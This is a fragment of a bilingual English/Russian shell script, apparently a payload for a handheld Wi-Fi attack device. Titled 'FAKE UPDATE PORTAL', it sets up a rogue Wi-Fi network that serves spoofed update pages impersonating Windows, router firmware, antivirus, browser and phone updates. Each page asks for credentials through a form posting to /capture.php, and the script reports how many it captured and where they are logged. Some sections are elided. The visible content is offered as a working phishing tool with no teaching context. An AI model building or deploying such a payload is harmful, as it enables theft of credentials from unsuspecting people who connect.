...
PAYLOAD_LANG="en"
case "${LC_ALL:-${LANG:-}}" in
    ru*|RU*) PAYLOAD_LANG="ru" ;;
esac

LANG_CHOICE=$(NUMBER_PICKER $'Language / Язык:\n1. English\n2. Русский' 1)
case $LANG_CHOICE in
    2) PAYLOAD_LANG="ru" ;;
    *) PAYLOAD_LANG="en" ;;
esac

L() { [ "$PAYLOAD_LANG" = "ru" ] && printf '%s' "$2" || printf '%s' "$1"; }

MAIN_PROMPT_EN="FAKE UPDATE PORTAL
...
MAIN_PROMPT_RU="ФАЛЬШИВЫЙ ПОРТАЛ ОБНОВЛЕНИЯ

Создаёт Wi-Fi с поддельным
обновлением программного обеспечения
и запрашивает учетные данные.
...
PROMPT "$(L "$MAIN_PROMPT_EN" "$MAIN_PROMPT_RU")"

TEMPLATE_PROMPT_EN=$'SELECT TEMPLATE:\n\n1. Windows Update\n2. Router Firmware Update\n3. Antivirus Critical\n4. Chrome/Firefox Update\n5. iOS/Android Update\n\nEnter number next.'
TEMPLATE_PROMPT_RU=$'ВЫБЕРИТЕ ШАБЛОН:\n\n1. Обновление Windows\n2. Обновление прошивки роутера\n3. Антивирусное обновление\n4. Обновление браузера\n5. Обновление системы телефона\n\nВведите номер.'

PROMPT "$(L "$TEMPLATE_PROMPT_EN" "$TEMPLATE_PROMPT_RU")"

TEMPLATE=$(NUMBER_PICKER "$(L "Template (1-5):" "Шаблон (1-5):")" 1)
...
<div class="form">
<form method="POST" action="/capture.php">
<p>Введите учетные данные для активации защиты:</p>
...
PROMPT "$(L $'FAKE UPDATE COMPLETE\n\nSSID: $SSID\nCredentials: $CRED_COUNT\n\nЖурнал: $CRED_LOG\n\nPress OK to exit.' $'ФАЛЬШИВОЕ ОБНОВЛЕНИЕ ЗАВЕРШЕНО\n\nSSID: $SSID\nУчётные данные: $CRED_COUNT\n\nФайл: $CRED_LOG\n\nНажмите OK для выхода.')"
